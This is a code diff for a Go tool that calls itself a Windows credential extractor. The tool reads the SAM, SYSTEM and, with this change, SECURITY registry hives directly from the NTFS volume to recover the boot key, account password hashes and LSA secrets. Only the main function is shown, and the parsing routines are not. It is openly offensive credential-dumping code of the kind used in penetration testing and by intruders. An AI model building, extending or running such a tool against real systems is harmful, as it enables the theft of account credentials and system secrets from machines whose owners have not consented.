@@ -7,7 +7,7 @@ import (
 
 func main() {
 	fmt.Println("\n╔════════════════════════════════════════════════════════════╗")
-	fmt.Println("║           windows credential extractor v1.0               ║")
+	fmt.Println("║           windows credential extractor                    ║")
 	fmt.Println("║         sam/system direct ntfs registry parser            ║")
 	fmt.Println("╚════════════════════════════════════════════════════════════╝\n")
 	
@@ -30,6 +30,7 @@ func main() {
 	fmt.Println("[+] reading registry hives from disk...")
 	samData := extractFile(volumeHandle, ntfs, `C:\Windows\System32\config\SAM`)
 	systemData := extractFile(volumeHandle, ntfs, `C:\Windows\System32\config\SYSTEM`)
+	securityData := extractFile(volumeHandle, ntfs, `C:\Windows\System32\config\SECURITY`)
 	
 	if samData == nil || systemData == nil {
 		fmt.Println("[+] failed to extract registry hives")
@@ -37,10 +38,7 @@ func main() {
 	}
 	
 	fmt.Println("[+] parsing system hive...")
-	var bootKey []byte
-	if systemData != nil {
-		bootKey = parseSYSTEM(systemData)
-	}
+	bootKey := parseSYSTEM(systemData)
 	
 	if bootKey == nil {
 		fmt.Println("[+] failed to extract bootkey")
@@ -50,6 +48,12 @@ func main() {
 	fmt.Println("[+] parsing sam hive...")
 	if samData != nil {
 		parseSAM(samData, bootKey)
+	}
+	
+	if securityData != nil {
+		parseSECURITY(securityData, bootKey)
+	} else {
+		fmt.Println("[+] security hive not extracted, skipping lsa secrets")
 	}
 	
 	fmt.Println("\n[+] extraction complete!\n")
